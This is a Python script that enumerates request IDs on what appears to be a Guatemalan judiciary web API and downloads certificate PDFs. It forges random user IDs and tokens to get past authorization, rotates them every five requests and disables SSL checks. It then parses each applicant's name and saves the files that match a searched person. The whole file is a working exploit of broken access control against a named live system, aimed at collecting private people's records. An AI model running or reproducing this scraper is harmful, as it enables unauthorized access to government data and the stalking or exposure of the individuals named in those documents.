import requests
import random
import string
import time
import io
import re
import PyPDF2
import logging
import argparse
import urllib3
from tqdm import tqdm
import warnings
from colorama import Fore, Style

# Ignorar advertencias SSL y de paquetes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Configurar logs
logging.basicConfig(filename='descargas.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def generar_token():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
    return base + ".."

def generar_usuario():
    return f"-{random.randint(4396100, 4396999)}"

def es_pdf_valido(content):
    return content.startswith(b"%PDF") and b"%%EOF" in content[-1024:]

def extraer_nombre_del_pdf(pdf_bytes):
    try:
        pdf = PyPDF2.PdfReader(io.BytesIO(pdf_bytes))
        texto = ""
        for pagina in pdf.pages:
            texto += pagina.extract_text() or ""
        nombre_match = re.search(r'Solicitante:\s+([A-Za-zÁÉÍÓÚÑáéíóúñ\s]+)', texto)
        if nombre_match:
            return nombre_match.group(1).strip()
    except Exception as e:
        logging.warning(f"No se pudo leer el PDF: {e}")
    return None

def buscar_y_descargar_nombre(nombre_buscado, inicio_id, fin_id, base_url):
    headers = {}
    usuario_actual = generar_usuario()
    token_actual = generar_token()

    print(f"\n🔍 Buscando coincidencia con: {Fore.CYAN}{nombre_buscado.upper()}{Style.RESET_ALL}\n")

    total_descargados = 0
    total_errores = 0

    barra = tqdm(range(inicio_id, fin_id + 1), desc=f"{Fore.GREEN}📥 Descargando PDFs{Style.RESET_ALL}", colour='green')

    for i, id_actual in enumerate(barra):
        if i % 5 == 0:
            usuario_actual = generar_usuario()
            token_actual = generar_token()
            logging.info(f"Cambiando credenciales → Usuario: {usuario_actual}, Token: {token_actual}")

        url = base_url.format(id=id_actual, usuario=usuario_actual, token=token_actual)

        try:
            response = requests.get(url, headers=headers, verify=False, timeout=10)

            if response.status_code == 200 and es_pdf_valido(response.content):
                nombre_extraido = extraer_nombre_del_pdf(response.content)

                if nombre_extraido:
                    palabras = nombre_buscado.lower().split()
                    if all(palabra in nombre_extraido.lower() for palabra in palabras):
                        nombre_archivo = f"constancia_{nombre_extraido.replace(' ', '_')}_{id_actual}.pdf"
                        with open(nombre_archivo, "wb") as f:
                            f.write(response.content)
                        print(f"{Fore.GREEN}✓ Coincidencia encontrada y descargada: {nombre_archivo}{Style.RESET_ALL}")
                        total_descargados += 1
                    else:
                        logging.info(f"No coincide: {nombre_extraido}")
                else:
                    logging.warning(f"No se pudo extraer nombre en ID {id_actual}")
            else:
                logging.warning(f"✗ Falló o no es PDF válido (status: {response.status_code})")
                total_errores += 1

            time.sleep(0.4)
        except Exception as e:
            logging.error(f"⚠️ Error con ID {id_actual}: {e}")
            total_errores += 1
            continue

        barra.set_postfix({
            "Encontrados": total_descargados,
            "Errores": total_errores
        })

    print(f"\n{Fore.CYAN}🔎 Búsqueda finalizada. Total descargados: {total_descargados}, Errores: {total_errores}{Style.RESET_ALL}")

# Ejecutar como script
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Buscar y descargar PDF por nombre parcial del solicitante")
    parser.add_argument("--nombre", type=str, required=True, help="Nombre o apellido del solicitante (parcial)")
    parser.add_argument("--inicio", type=int, default=1105, help="ID inicial")
    parser.add_argument("--fin", type=int, default=11481740, help="ID final")
    parser.add_argument("--url", type=str, default="https://zunil.oj.gob.gt:24472/CAPE_DMZ/webapi/Constancia/Solicitud/{id}/Usuario/{usuario}/validarAutorizacion/{token}/downloadArchivo", help="URL con placeholders")

    args = parser.parse_args()
    buscar_y_descargar_nombre(args.nombre, args.inicio, args.fin, args.url)

